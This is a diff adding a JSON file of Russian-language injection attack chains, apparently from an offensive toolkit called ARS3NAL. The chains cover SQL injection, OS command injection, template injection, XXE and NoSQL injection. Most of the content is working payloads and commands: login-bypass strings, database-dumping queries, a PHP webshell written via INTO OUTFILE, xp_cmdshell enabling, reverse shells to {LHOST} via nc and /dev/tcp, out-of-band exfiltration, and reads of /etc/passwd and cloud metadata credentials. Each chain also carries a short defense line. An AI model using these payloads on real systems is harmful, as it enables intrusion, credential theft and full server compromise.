@@ -1,0 +1,424 @@
+{
+  "domain": "Injection",
+  "domainLabel": "Инъекции → RCE",
+  "domainOrder": 2,
+  "source": "ARS3NAL",
+  "chains": [
+    {
+      "title": "SQLi: обход аутентификации одной кавычкой",
+      "level": "newbie",
+      "impact": "Вход под админом без пароля.",
+      "why": "Самый культовый SQLi-пейлоад и самый быстрый вин на легаси-форме логина.",
+      "precondition": "Форма логина, где запрос склеивается из ввода: SELECT * FROM users WHERE user='$u' AND pass='$p'.",
+      "tags": [
+        "sqli",
+        "auth-bypass",
+        "login"
+      ],
+      "realWorld": "OWASP SQLi auth-bypass; PortSwigger SQL injection labs.",
+      "defense": "Подготовленные выражения + серверное хеширование пароля (bcrypt/argon2); алерт на OR '1'='1 в параметрах auth.",
+      "steps": [
+        {
+          "title": "Пробуем поле username",
+          "kind": "payload",
+          "q": "SQL Injection",
+          "detail": "' OR '1'='1'-- -",
+          "success": "редирект на дашборд / выдан session-cookie"
+        },
+        {
+          "title": "Целимся в конкретного юзера",
+          "kind": "payload",
+          "q": "SQL Injection",
+          "detail": "admin'-- -"
+        },
+        {
+          "title": "Если ошибка на нескольких строках",
+          "kind": "payload",
+          "q": "SQL Injection",
+          "detail": "admin' LIMIT 1-- -"
+        },
+        {
+          "title": "Прогон wordlist'а байпасов в Intruder",
+          "kind": "payload",
+          "q": "SQL Injection",
+          "detail": "загрузить 30+ вариантов (' or 1=1#, \") or (\"1\"=\"1, ...) когда отличаются кавычки/скобки"
+        },
+        {
+          "title": "Приложение сверяет хеш пароля",
+          "kind": "payload",
+          "q": "SQL Injection",
+          "detail": "admin' AND 1=0 UNION SELECT 'admin','<md5(P@ssw0rd)>'-- -  (войти с известным плейнтекстом)"
+        }
+      ]
+    },
+    {
+      "title": "SQLi: дамп БД через UNION",
+      "level": "newbie",
+      "impact": "Полное чтение БД (юзеры, хеши паролей, PII, ключи API), критично на PII.",
+      "why": "UNION это самый быстрый и наглядный способ превратить один отражённый параметр в полный дамп.",
+      "precondition": "Параметр, значение которого отражается на странице (id товара, поиск), а запрос возвращает видимые строки.",
+      "tags": [
+        "sqli",
+        "union",
+        "dump"
+      ],
+      "realWorld": "PortSwigger 'SQL injection UNION attacks'.",
+      "defense": "Параметризованные запросы; WAF ловит UNION SELECT и information_schema.",
+      "steps": [
+        {
+          "title": "Ломаем запрос",
+          "kind": "payload",
+          "q": "SQL Injection",
+          "detail": "'  затем  '-- -",
+          "success": "появляется/исчезает 500 или 'error in your SQL syntax'"
+        },
+        {
+          "title": "Подтверждаем инъекцию логикой",
+          "kind": "payload",
+          "q": "SQL Injection",
+          "detail": "id=1' AND 1=1-- -  (норма)  vs  id=1' AND 1=2-- -  (строки исчезли)"
+        },
+        {
+          "title": "Считаем колонки",
+          "kind": "payload",
+          "q": "SQL Injection",
+          "detail": "' ORDER BY 1-- -  ...инкремент до 'Unknown column N'"
+        },
+        {
+          "title": "Ищем строковую/видимую колонку",
+          "kind": "payload",
+          "q": "SQL Injection",
+          "detail": "' UNION SELECT NULL,'AAA',NULL-- -  (где печатается AAA это твой канал вывода)"
+        },
+        {
+          "title": "Снимаем структуру",
+          "kind": "payload",
+          "q": "SQL Injection",
+          "detail": "' UNION SELECT 1,GROUP_CONCAT(table_name),3 FROM information_schema.tables WHERE table_schema=database()-- -"
+        },
+        {
+          "title": "Дампим креды",
+          "kind": "payload",
+          "q": "SQL Injection",
+          "detail": "' UNION SELECT 1,GROUP_CONCAT(username,0x3a,password),3 FROM users-- -"
+        },
+        {
+          "title": "Автоматизируем",
+          "kind": "command",
+          "q": "sqlmap",
+          "detail": "sqlmap -r req.txt -p id --technique=U --dump --batch"
+        }
+      ]
+    },
+    {
+      "title": "SQLi: слепая экстракция (boolean и time-based)",
+      "level": "intermediate",
+      "impact": "То же полное чтение БД, но через параметр без видимого вывода.",
+      "why": "Большинство реальных SQLi слепые (логин, cookie, заголовки, JSON), поэтому бинарный поиск это база, отличающая новичка от хантера.",
+      "precondition": "Инъекция, где ответ одинаков, но поведение различается на true/false (boolean) или можно вызвать задержку (time).",
+      "tags": [
+        "sqli",
+        "blind",
+        "boolean",
+        "time-based"
+      ],
+      "realWorld": "PortSwigger 'Blind SQL injection'.",
+      "defense": "Параметризация; тысячи почти одинаковых запросов с SUBSTRING/ASCII или SLEEP это явный сигнал WAF/IDS.",
+      "steps": [
+        {
+          "title": "Заводим оракул true/false",
+          "kind": "payload",
+          "q": "SQL Injection",
+          "detail": "id=1 AND 1=1-- -  (страница A)  vs  id=1 AND 1=2-- -  (страница B)"
+        },
+        {
+          "title": "Извлекаем бисекцией (boolean)",
+          "kind": "script",
+          "q": "Boolean-based blind SQLi extractor",
+          "detail": "python3 sqli_boolean_blind.py -u 'https://t/item?id=1*' -m 'Welcome' -q '(SELECT password FROM users LIMIT 1)'  (~7 запросов/символ)"
+        },
+        {
+          "title": "Если нет различий в контенте, доказываем временем",
+          "kind": "payload",
+          "q": "SQL Injection",
+          "detail": "' AND SLEEP(5)-- -  (MySQL)  /  '; WAITFOR DELAY '0:0:5'-- -  (MSSQL)"
+        },
+        {
+          "title": "Извлекаем по таймингу",
+          "kind": "script",
+          "q": "Time-based blind SQLi extractor (multi-DBMS)",
+          "detail": "python3 sqli_time_blind.py -u 'https://t/item?id=1*' --dbms mysql -q 'user()' --delay 3"
+        },
+        {
+          "title": "OOB-шорткат если разрешён egress",
+          "kind": "payload",
+          "q": "SQL Injection",
+          "detail": "LOAD_FILE(CONCAT('\\\\\\\\',(SELECT pass FROM users LIMIT 1),'.id.oast.pro\\\\a'))  и смотрим interactsh"
+        },
+        {
+          "title": "Отдаём инструменту",
+          "kind": "command",
+          "q": "sqlmap",
+          "detail": "sqlmap ... --technique=BT  (или ghauri) для крупных дампов"
+        }
+      ]
+    },
+    {
+      "title": "SQLi → RCE: от инъекции к шеллу",
+      "level": "intermediate",
+      "impact": "Выполнение кода на хосте БД/веба (полная компрометация сервера).",
+      "why": "Эскалация data-only SQLi в RCE это самый большой множитель импакта; каноничны три пути (MySQL file write, MSSQL xp_cmdshell, PostgreSQL COPY PROGRAM).",
+      "precondition": "SQLi с высокими привилегиями БД (FILE / sysadmin / superuser).",
+      "tags": [
+        "sqli",
+        "rce",
+        "mysql",
+        "mssql",
+        "postgresql"
+      ],
+      "realWorld": "PayloadsAllTheThings SQLi (INTO OUTFILE / xp_cmdshell / COPY PROGRAM).",
+      "defense": "Least-privilege аккаунт БД (без FILE/sysadmin), secure_file_priv, отключённый xp_cmdshell.",
+      "steps": [
+        {
+          "title": "Проверяем привилегии и путь записи",
+          "kind": "payload",
+          "q": "SQL Injection",
+          "detail": "SELECT current_setting('is_superuser')  /  SELECT is_srvrolemember('sysadmin')"
+        },
+        {
+          "title": "MySQL: webshell через INTO OUTFILE",
+          "kind": "payload",
+          "q": "SQL Injection",
+          "detail": "... UNION SELECT \"<?php system($_GET['cmd']); ?>\" INTO OUTFILE '/var/www/html/x.php'  затем /x.php?cmd=id"
+        },
+        {
+          "title": "MSSQL: включить и выполнить xp_cmdshell",
+          "kind": "payload",
+          "q": "SQL Injection",
+          "detail": "EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE; затем EXEC xp_cmdshell 'whoami'"
+        },
+        {
+          "title": "PostgreSQL: COPY FROM PROGRAM",
+          "kind": "payload",
+          "q": "SQL Injection",
+          "detail": "COPY shell FROM PROGRAM 'id';  (superuser / pg_execute_server_program)"
+        },
+        {
+          "title": "Апгрейд в reverse shell",
+          "kind": "revshell",
+          "q": "",
+          "detail": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {LHOST} 4444 >/tmp/f"
+        },
+        {
+          "title": "Однокомандная автоматизация",
+          "kind": "command",
+          "q": "sqlmap",
+          "detail": "sqlmap -u '...' --technique=U --os-shell"
+        }
+      ]
+    },
+    {
+      "title": "OS Command Injection → reverse shell",
+      "level": "newbie",
+      "impact": "Выполнение произвольных команд и интерактивный reverse shell на хосте.",
+      "why": "Везде, где приложение шеллит наружу (ping, DNS, конвертеры картинок/PDF), это прямой путь к RCE.",
+      "precondition": "Фича, передающая ввод в системный шелл (ping -c4 $ip, convert, nslookup, экспорт).",
+      "tags": [
+        "command-injection",
+        "rce",
+        "reverse-shell"
+      ],
+      "realWorld": "PortSwigger 'OS command injection'.",
+      "defense": "Exec-array API без шелла, строгие allowlist'ы; ;, |, $(, ${IFS}, sleep в параметрах = высокий сигнал.",
+      "steps": [
+        {
+          "title": "Внедряем разделитель",
+          "kind": "payload",
+          "q": "Command Injection",
+          "detail": "8.8.8.8; id   |   8.8.8.8 | id   |   8.8.8.8 && id",
+          "success": "uid=... в ответе"
+        },
+        {
+          "title": "Внедряем внутрь команды",
+          "kind": "payload",
+          "q": "Command Injection",
+          "detail": "$(id)  /  `id`  когда ввод попадает в середину аргумента"
+        },
+        {
+          "title": "Если вывод скрыт, доказываем вслепую",
+          "kind": "script",
+          "q": "Time-based command injection detector (separators x sleep)",
+          "detail": "python3 cmdi_time.py -u 'https://t/ping?host=127.0.0.1*' --base 127.0.0.1 --delay 5"
+        },
+        {
+          "title": "Обход фильтра пробелов",
+          "kind": "payload",
+          "q": "Command Injection",
+          "detail": "cat${IFS}/etc/passwd   |   {cat,/etc/passwd}   |   cat</etc/passwd"
+        },
+        {
+          "title": "Обход фильтра ключевых слов",
+          "kind": "payload",
+          "q": "Command Injection",
+          "detail": "w'h'o'am'i   |   who$@ami   |   /???/??t /???/p??s??"
+        },
+        {
+          "title": "Дропаем reverse shell",
+          "kind": "revshell",
+          "q": "",
+          "detail": "bash -c 'bash -i >& /dev/tcp/{LHOST}/4444 0>&1'  (URL-encode)"
+        }
+      ]
+    },
+    {
+      "title": "SSTI → RCE: от ${7*7} к шеллу",
+      "level": "intermediate",
+      "impact": "Удалённое выполнение кода на сервере приложения.",
+      "why": "Template injection прячется в полях имени, генераторах PDF/инвойсов/писем и 'preview', а паттерн detect-fingerprint-escalate одинаков на пяти движках.",
+      "precondition": "Ввод, отрендеренный обратно через серверный шаблон (приветствие, тема/тело письма, генерируемый документ).",
+      "tags": [
+        "ssti",
+        "rce",
+        "jinja2",
+        "twig",
+        "freemarker"
+      ],
+      "realWorld": "James Kettle 'Server-Side Template Injection' (Black Hat); Hackmanit template-injection-table.",
+      "defense": "Никогда не рендерить ввод как шаблон; sandbox движка; {{, ${, __globals__ = сильные сигналы.",
+      "steps": [
+        {
+          "title": "Пробник арифметики",
+          "kind": "payload",
+          "q": "Server Side Template Injection",
+          "detail": "{{7*7}}  /  ${7*7}  /  <%= 7*7 %>",
+          "success": "отрендерилось 49 = SSTI"
+        },
+        {
+          "title": "Различаем движок",
+          "kind": "payload",
+          "q": "Server Side Template Injection",
+          "detail": "{{7*'7'}}  ->  7777777 = Jinja2,  49 = Twig"
+        },
+        {
+          "title": "Jinja2 RCE (Python)",
+          "kind": "payload",
+          "q": "Server Side Template Injection",
+          "detail": "{{ lipsum.__globals__['os'].popen('id').read() }}"
+        },
+        {
+          "title": "Twig RCE (PHP)",
+          "kind": "payload",
+          "q": "Server Side Template Injection",
+          "detail": "{{['id']|filter('system')}}"
+        },
+        {
+          "title": "Freemarker RCE (Java)",
+          "kind": "payload",
+          "q": "Server Side Template Injection",
+          "detail": "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ ex('id') }"
+        },
+        {
+          "title": "Эскалация в reverse shell",
+          "kind": "command",
+          "q": "SSTImap / tplmap",
+          "detail": "sstimap -u 'http://t/?name=John' --os-shell"
+        }
+      ]
+    },
+    {
+      "title": "XXE: чтение файлов, SSRF и слепой OOB-эксфил",
+      "level": "intermediate",
+      "impact": "Чтение произвольных файлов (секреты, исходники, web.config), внутренний SSRF, OOB-кража данных (выше при доступе к метаданным облака).",
+      "why": "XML-парсеры повсюду (SOAP, SAML, загрузка SVG/DOCX, REST, тайно принимающий XML), а один DOCTYPE даёт три разных high-impact примитива.",
+      "precondition": "Эндпоинт, парсящий XML (или приводимый к этому через Content-Type: application/xml) с включёнными внешними сущностями.",
+      "tags": [
+        "xxe",
+        "file-read",
+        "ssrf",
+        "oob"
+      ],
+      "realWorld": "Yunusov 'XML Out-Of-Band Data Retrieval' (2013); PortSwigger XXE labs.",
+      "defense": "Отключить DTD/внешние сущности (disallow-doctype-decl); исходящие на Collaborator или file://, php://filter в XML это сигнал.",
+      "steps": [
+        {
+          "title": "Подтверждаем парсинг сущностей",
+          "kind": "payload",
+          "q": "XXE Injection",
+          "detail": "<!ENTITY example \"Doe\">  и смотрим, развернулось ли в отражённом поле"
+        },
+        {
+          "title": "Читаем файл",
+          "kind": "payload",
+          "q": "XXE Injection",
+          "detail": "<!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><root>&xxe;</root>",
+          "success": "root:x:0:0 в ответе"
+        },
+        {
+          "title": "Снимаем исходник через PHP wrapper",
+          "kind": "payload",
+          "q": "XXE Injection",
+          "detail": "<!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=index.php\">"
+        },
+        {
+          "title": "Пивот в SSRF",
+          "kind": "payload",
+          "q": "XXE Injection",
+          "detail": "<!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/iam/security-credentials/\">"
+        },
+        {
+          "title": "Уходим в слепой OOB через внешний DTD",
+          "kind": "script",
+          "q": "Blind XXE OOB exfil server (evil.dtd + base64 catcher)",
+          "detail": "поднять evil.dtd, указать <!DOCTYPE x SYSTEM \"http://you/evil.dtd\">, ловить base64 на листенере"
+        }
+      ]
+    },
+    {
+      "title": "NoSQL-инъекция: обход логина и слепая экстракция",
+      "level": "newbie",
+      "impact": "Вход без пароля и выкачивание данных по полям.",
+      "why": "Современные MEAN/MERN-приложения полны MongoDB-объектов запроса, и подмена значения на оператор ($ne/$gt/$regex) это лёгкий частый байпас.",
+      "precondition": "Ввод попадает в фильтр MongoDB-запроса, парсер принимает объекты (JSON-тело или param[$op]= в form-urlencoded).",
+      "tags": [
+        "nosql",
+        "mongodb",
+        "auth-bypass"
+      ],
+      "realWorld": "PayloadsAllTheThings NoSQL Injection; Root Me 'NoSQL injection'.",
+      "defense": "Приводить ввод к строке и отклонять объекты/$-ключи; алерт на [$ne], $regex, $where, $gt в телах.",
+      "steps": [
+        {
+          "title": "Обход логина (JSON)",
+          "kind": "payload",
+          "q": "NoSQL Injection",
+          "detail": "{\"username\":{\"$ne\":null},\"password\":{\"$ne\":null}}",
+          "success": "302 на дашборд"
+        },
+        {
+          "title": "Обход логина (form-urlencoded)",
+          "kind": "payload",
+          "q": "NoSQL Injection",
+          "detail": "username[$ne]=x&password[$ne]=x"
+        },
+        {
+          "title": "Целимся в известного админа",
+          "kind": "payload",
+          "q": "NoSQL Injection",
+          "detail": "{\"username\":{\"$in\":[\"admin\",\"administrator\",\"root\"]},\"password\":{\"$gt\":\"\"}}"
+        },
+        {
+          "title": "Слепо извлекаем пароль через $regex",
+          "kind": "payload",
+          "q": "NoSQL Injection",
+          "detail": "{\"username\":{\"$eq\":\"admin\"},\"password\":{\"$regex\":\"^m\"}}  растим префикс на TRUE-ответах"
+        },
+        {
+          "title": "Автоматизируем экстракцию",
+          "kind": "script",
+          "q": "MongoDB blind extractor ($regex char-by-char)",
+          "detail": "MongoDB blind extractor ($regex посимвольно)"
+        }
+      ]
+    }
+  ]
+}
